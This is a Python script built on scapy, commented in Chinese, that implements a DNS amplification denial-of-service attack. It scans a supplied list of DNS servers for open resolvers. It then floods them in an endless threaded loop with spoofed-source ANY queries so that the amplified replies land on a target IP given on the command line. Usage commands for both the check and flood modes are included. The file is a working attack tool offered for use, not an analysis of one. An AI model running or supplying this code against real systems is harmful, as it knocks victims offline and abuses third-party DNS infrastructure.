# coding=utf-8
"""
DATE:   2021/11/26
AUTHOR: TesterCC
"""
import os,sys,threading,time
from optparse import OptionParser
from scapy.all import *

from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR

"""
DNS查询放大攻击

通过网络中存在的DNS服务器资源，对目标主机发起的拒绝服务攻击，其原理是伪造源地址为被攻击目标的地址，向DNS递归服务器发起查询请求，
此时由于源IP是伪造的，固在DNS服务器回包的时候，会默认回给伪造的IP地址，从而使DNS服务成为了流量放大和攻击的实施者，
通过查询大量的DNS服务器，从而实现反弹大量的查询流量，导致目标主机查询带宽被塞满，实现DDoS的目的。

ref:
https://www.cnblogs.com/LyShark/p/12411435.html#_label0


1.检查：
python dns_amp.py --mode check -f dnslist.log

2.攻击：
python dns_amp.py --mode flood -f pass.log
"""

def Inspect_DNS_Usability(filename):
    proxy_list = []
    fp = open(filename,"r")
    for i in fp.readlines():
        try:
            addr = i.replace("\n","")
            respon = sr1(IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname="www.baidu.com")),timeout=2)
            if respon != "":
                proxy_list.append(str(respon["IP"].src))
        except Exception:
            pass
    return proxy_list

def DNS_Flood(target,dns):
    # 构造IP数据包
    ip_pack = IP()
    ip_pack.src = target
    ip_pack.dst = dns
#   ip_pack.src = "192.168.1.2"
#   ip_pack.dst = "8.8.8.8"
    # 构造UDP数据包
    udp_pack = UDP()
    udp_pack.sport = 53
    udp_pack.dport = 53
    # 构造DNS数据包
    dns_pack = DNS()
    dns_pack.rd = 1
    dns_pack.qdcount = 1
    # 构造DNSQR解析
    dnsqr_pack = DNSQR()
    dnsqr_pack.qname = "baidu.com"
    dnsqr_pack.qtype = 255
    dns_pack.qd = dnsqr_pack
    respon = (ip_pack/udp_pack/dns_pack)
    sr1(respon,verbose=False)

if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("--mode",dest="mode",help="选择执行命令<check=检查DNS可用性/flood=攻击>")
    parser.add_option("-f","--file",dest="file",help="指定一个DNS字典,里面存储DNSIP地址")
    parser.add_option("-t",dest="target",help="输入需要攻击的IP地址")
    (options,args) = parser.parse_args()
    # 使用方式: main.py --mode=check -f xxx.log
    if options.mode == "check" and options.file:
        proxy = Inspect_DNS_Usability(options.file)
        fp = open("pass.log","w+")
        for item in proxy:
            fp.write(item + "\n")
        fp.close()
        print("[+] DNS地址检查完毕,当前可用DNS保存为 pass.log")
    # 使用方式: main.py --mode=flood -f xxx.log -t 192.168.1.1
    elif options.mode == "flood" and options.target and options.file:
        with open(options.file,"r") as fp:
            countent = [line.rstrip("\n") for line in fp]
            # 注意捕获异常，不然ctrl+c无法终止
            while True:
                randomDNS = str(random.sample(countent,1)[0])
                print("[+] 目标主机: {} -----> 随机DNS: {}".format(options.target,randomDNS))
                t = threading.Thread(target=DNS_Flood,args=(options.target,randomDNS,))
                t.start()
    else:
        parser.print_help()